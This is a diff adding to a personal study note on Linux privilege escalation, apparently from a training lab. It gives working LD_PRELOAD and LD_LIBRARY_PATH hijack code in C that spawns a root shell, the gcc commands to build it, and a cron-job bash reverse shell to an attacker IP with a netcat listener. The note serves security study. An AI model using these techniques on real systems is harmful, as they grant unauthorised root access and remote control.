@@ -146,3 +146,122 @@ Is a name/value pair that is set outside of a program, that can be accessed by t
 ```
 
 **sudo** can be configured to inherit environment variables from the user's environment.
+
+```ad-info
+title: LD_PRELOAD and LD_LIBRARY_PATH
+**LD_PRELOAD**
+It will load a shared object first before any other library(includes C runtime library). More [here](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html)
+
+**LD_LIBRARY_PATH**
+List a directories of shared libraries. More [here](https://linuxhint.com/what-is-ld-library-path/)
+```
+
+---
+
+**NOTE:** gcc is a compiler for programming languages.
+
+Create a shared **object** using the code located at **/home/user/tools/sudo/preload.c** wherein **.c** is the file extension of C programming language.
+```bash
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+```
+
+Code content.
+```C
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	# Sets the real user id.
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+```
+
+This show all environment variables that are inherited.
+![[Pasted image 20220729203511.png|center]]
+
+A root shell pops up.
+![[Pasted image 20220729203645.png]]
+
+---
+
+`ldd /usr/sbin/apache2` prints out all shared libraries that the program requires.
+
+Creates a shared object from a code located in **gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c**.
+```Shell
+gcc -o /tmp/libt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+Code content.
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+```
+
+A root shell pops up.
+![[Pasted image 20220729203645.png]]
+
+---
+
+## Cron Jobs - File Permissions
+
+A programming, bash, or scripts that runs on schedule depends on what time the user set in.
+
+Cron table files or most commonly known as **Crontab** stores all configuration about **cronjobs** 
+
+Located at **/etc/crontab**.
+
+More info [[Bandit 21-34#Bandit 21|Bandit 21]].
+
+---
+
+![[Pasted image 20220729205129.png]]
+
+```Shell
+#!/bin/bash  
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+```
+
+**bash** allows us to interact with the computer.
+**-i** allows for an interactive shell (in image below after listening to port 4444 it allowed us to have a **shell**).
+**>&** redirects standard output and standard error in file in question.
+
+**/dev/tcp/ip-address/port** opens a tcp connection to the specified socket.
+(10.10.10.10 is the Attacker's IP)
+```ad-note
+Remember **everything** on Linux is a file.
+```
+
+**0>&1** 0 represents **standard input**, 1 represents **standard out**. and 2 represents standard error. 
+
+More here about the command [above](https://www.reddit.com/r/LiveOverflow/comments/a2kahp/comment/eazuui7/).
+
+
+Listen to any machine that will connect to the temporary server in port **4444**.
+```Shell
+nc -nvlp 4444
+```
+
+Flags explanation:
+**-v** output slightly more detailed information on what's happening.
+**-n** don't return any **Domain Name System** or **Service lookup** on the specified address, hostnames, or ports.
+**-l** listen to any connection (in this case the **bash** script above. it will also acts as a **server**)
+**-p** specify the source port.
+Since the **cron job** runs every minute we are now connected to the Victim's machine through **nc**.
+
+![[Pasted image 20220729205801.png]]
+
+---
+
